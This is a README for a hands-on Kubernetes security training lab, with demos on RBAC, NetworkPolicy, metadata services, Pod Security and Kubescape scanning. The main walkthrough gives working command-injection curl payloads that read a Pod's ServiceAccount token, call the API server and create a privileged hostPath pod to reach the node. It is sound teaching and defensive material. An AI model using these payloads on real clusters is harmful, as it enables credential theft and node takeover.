# Kubernetes Security Lab

A hands-on Kubernetes security lab built around one continuous attack story:

**a vulnerable web app with real command injection → steal the Pod's ServiceAccount token
→ abuse an over-broad RBAC grant → create a privileged Pod → escape to the underlying node.**

Alongside that main chain, the lab includes standalone demos for RBAC (`kubectl auth can-i`),
NetworkPolicy (default-deny + scoped allow), the Kubernetes API server, cloud metadata
services (a local Azure IMDS simulation), Pod Security (restricted vs. privileged), and
static analysis with Kubescape.

Every command in this repo has actually been run against a real cluster — see `slides.md`
for the tested output alongside each step.

> ⚠️ This repo contains an intentionally vulnerable application and intentionally
> over-permissioned RBAC/Pod configs. Only run it in an isolated training cluster
> (minikube/kind), never against a shared or production cluster.

## Requirements

- Docker (daemon running)
- `minikube`, `kubectl`
- `kubescape` (`brew install kubescape`) — only needed for the static-analysis demo

## Quick start

```bash
git clone https://github.com/roman-cybersteps/k8s-security-lab.git
cd k8s-security-lab
./setup.sh
```

This starts a minikube cluster (with Calico, so NetworkPolicy actually works), builds the
vulnerable app image directly into minikube's Docker daemon, and deploys every demo's
baseline state — tested end to end from a clean `minikube delete` before shipping.

Then start the attack walkthrough:

```bash
kubectl port-forward svc/cluster-health-dashboard 5000:5000 -n default
open http://localhost:5000
```

When you're done:

```bash
./teardown.sh
```

## The main attack chain (start here)

The "Cluster Health Dashboard" at `http://localhost:5000` is a fake internal diagnostics
tool with a real OS command injection bug in its ping feature ([app/app.py](app/app.py)).
Its ServiceAccount is over-permissioned the way a real one often is in practice — someone
reused a CI/CD deploy identity (which legitimately needs to create Pods) for a small
internal app that only ever needed to read its own config.

**1. Exploit the command injection to steal the Pod's own credentials:**
```bash
curl -s -G "http://localhost:5000/ping" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```
The ServiceAccount token comes back in the HTTP response — one request, no shell needed.

**2. Use the stolen token to talk to the Kubernetes API server directly, still through the injection:**
```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces'
```
Returns every namespace in the cluster — this app's identity was never supposed to see that.

**3. Escalate: use the same token to create a privileged Pod** (this ServiceAccount can
`create pods` cluster-wide, a permission it never needed for its actual job):
```bash
curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d @/opt/privileged-pod.json https://kubernetes.default.svc/api/v1/namespaces/default/pods'
```
The pod definition it POSTs (baked into the image at `/opt/privileged-pod.json`) is
`privileged: true` with `hostPath: /` mounted — full access to the node.

**4. Confirm the escalation actually reached the node**, not just the container:
```bash
kubectl wait --for=condition=Ready pod/pwned-via-rbac -n default --timeout=60s
minikube ssh -- cat /PWNED-BY-LAB.txt
```
That file was written by a Pod running on the cluster, straight onto the VM's real
filesystem — application-level command injection turned into node compromise, entirely
through the API server, no direct `kubectl` access ever used.

```bash
kubectl delete pod pwned-via-rbac -n default   # clean up before moving on
```

## Standalone demos

| Folder | What it shows |
|---|---|
| `manifests/02-rbac-can-i/` | Namespaced Role/RoleBinding — grant `list`, then narrow it to `get`, verified live with `kubectl auth can-i` |
| `manifests/03-rbac-popquiz-live/` | A `ClusterRole`+`ClusterRoleBinding` misconfig proven to leak a secret across namespaces, then fixed with a namespaced `Role` |
| `manifests/04-network-policy/` | Two tenants on a flat network (fully open) → `default-deny-all` (fully blocked) → scoped `allow-from-tenant-1` (restored for just one path) |
| `manifests/05-metadata/` | Local stand-in for the Azure Instance Metadata Service, since minikube isn't an Azure VM — same request shape works verbatim against the real `169.254.169.254` on AKS |
| `manifests/06-pod-security/` | `restricted-pod` (can't touch the host at all) vs. `dangerous-pod` (privileged + hostPath, writes straight to the node) |

Commands for each are in `slides.md`, in the matching "Demo:" slide, with the actual
tested output included.

## Kubescape (shift-left)

```bash
kubescape scan framework nsa .
```

Run against this repo's own manifests, this catches the intentionally-bad configs before
they're ever deployed: the privileged containers in `06-pod-security/`, the plaintext
secret in `03-rbac-popquiz-live/victim-secret.yaml`, and the missing resource limits
across the board. Tested score: **58.11%** compliance, 17 high-severity findings.

## Repo layout

```
app/                          the vulnerable "Cluster Health Dashboard" (Flask, real command injection)
manifests/01-vulnerable-app/  its Deployment + over-permissioned RBAC
manifests/02-rbac-can-i/      RBAC allow/deny demo
manifests/03-rbac-popquiz-live/  the pop-quiz misconfig, live
manifests/04-network-policy/  tenant isolation demo
manifests/05-metadata/        local Azure IMDS simulation
manifests/06-pod-security/    restricted vs. privileged pod
setup.sh / teardown.sh        environment lifecycle
slides.md                     the full session deck, with tested output inline
```

## Notes for instructors

- **NetworkPolicy needs a CNI that enforces it.** Minikube's default CNI silently ignores
  `NetworkPolicy` objects — `setup.sh` starts minikube with `--cni=calico` specifically for
  this. Running on a different cluster (kind, AKS, GKE)? Confirm the CNI supports
  `NetworkPolicy` before relying on that demo live.
- **The IMDS demo is a local simulation, not real Azure.** The real `169.254.169.254`
  endpoint only exists on an actual Azure VM/AKS node. If you want the *real* version of
  this demo against your AKS environment, that needs to be tested there separately — only
  the local stand-in here has been verified.
- **`role-deny.yaml`, `fixed-role.yaml`, `np-default-deny.yaml`, `np-allow-from-tenant1.yaml`**
  are deliberately not applied by `setup.sh` — they're the "after" state for their demos,
  meant to be applied live in front of the class so the before/after contrast is visible.
